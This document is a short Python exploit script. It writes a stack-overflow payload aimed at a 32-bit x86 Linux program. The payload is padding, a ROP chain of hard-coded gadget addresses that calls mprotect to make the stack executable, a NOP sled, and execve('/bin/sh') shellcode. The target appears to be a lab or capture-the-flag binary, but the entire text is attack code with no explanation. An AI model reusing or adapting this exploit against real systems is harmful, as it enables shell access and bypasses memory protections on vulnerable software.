import sys
import struct

def le(x):
    return struct.pack("<L",x)

# x86/linux/exec: 24 bytes
shellcode = (
             "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
             "\xc9\x89\xca\x6a\x0b\x58\xcd\x80")


buf = ""
buf += "A"*44

# Setup registers with correct argument values
buf += le(0x08052476) # pop edx; ret;
buf += le(0xffffffff) # EDX value start
buf += le(0x0804eda1) # inc edx; add al,0x83; ret;
buf += le(0x0804eda1) # inc edx; add al,0x83; ret;
buf += le(0x0804eda1) # inc edx; add al,0x83; ret;
buf += le(0x0804eda1) # inc edx; add al,0x83; ret;
buf += le(0x0804eda1) # inc edx; add al,0x83; ret;
buf += le(0x0804eda1) # inc edx; add al,0x83; ret;
buf += le(0x0804eda1) # inc edx; add al,0x83; ret;
buf += le(0x0804eda1) # inc edx; add al,0x83; ret;
buf += le(0x080658d7) # pop ecx; adc al,0x89; ret
buf += le(0x11111111) # amount of memory
buf += le(0x0805249e) # pop ebx; ret
buf += le(0xbffdf001) # address of stack 0xbffdf000 - (0xbffdf001 to bypass 0x00)
buf += le(0x0804f871) # dec ebx; ret

# mprotect call / call shellcode
buf += le(0x0805229d) #0x0805229d mprotect + 13
buf += "A"*4 # pad for pop ebx
buf += le(0xbffff614) # My machine le(0xbffff914) # ret to shellcode
buf += "\x90" * 300 # NOPsled for ease
buf += shellcode # exec /bin/sh

sys.stdout.write(buf)
